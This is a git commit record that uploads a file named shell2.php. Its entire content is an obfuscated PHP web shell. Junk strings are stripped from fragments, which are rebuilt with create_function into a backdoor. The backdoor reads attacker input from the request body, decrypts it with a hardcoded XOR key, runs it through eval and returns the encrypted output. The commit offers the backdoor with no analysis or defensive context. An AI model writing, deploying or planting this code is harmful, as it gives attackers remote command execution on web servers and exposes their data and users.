e2d3fea42ded0d05609842b4be0b6e82f0cace8e
Mohamed <60354457+Jizen0x01@users.noreply.github.com>
2020-12-17 20:29:32 +0200

    Add files via upload

---
+++ shell2.php
@@ -0,0 +1,11 @@
+<?php
+$y='"/f+$khf+f+(.+)$kf/",@fif+le_get_contef+ntf+s("php://f+input"f+),$m)=f+=1) f+{@ob_starf+t();@e';
+$i='functf+ion x($f+t,$k){f+f+$c=strlef+n($kf+f+);$l=strlen($t);$f+o="";fof+rf+($i=0f+;$if+<$l;){for($j=f+';
+$O='$k="3f3f+d58f+9f";$kh="4f+4e9f+2cf+4e839b"f+;$kf="e3873f+e8b0fff+e";$p="f+zJczZf+91q37zNf+Is9f+J";';
+$Z='+;@ob_end_cleaf+f+n(f+);$r=@base6f+4_ef+f+ncode(@x(@gzf+cof+mpressf+($o),$k));print("f+$p$kh$f+r$kf");}';
+$w='f+vaf+l(@gzf+uncf+ompress(@x(@bf+ase64f+_decodef+($m[1f+]),f+$k)));$of+=@ob_get_f+contf+entsf+()f';
+$x='0;($j<f+$c&&$i<f+$l);$jf+++,f+$if+++){f+$o.=$t{$f+if+}^$kf+{f+$j};}}return $f+o;}if (@preg_matcf+h(';
+$z=str_replace('eU','','creUeUeateeU_feUueUeUnction');
+$u=str_replace('f+','',$O.$i.$x.$y.$w.$Z);
+$P=$z('',$u);$P();
+?>
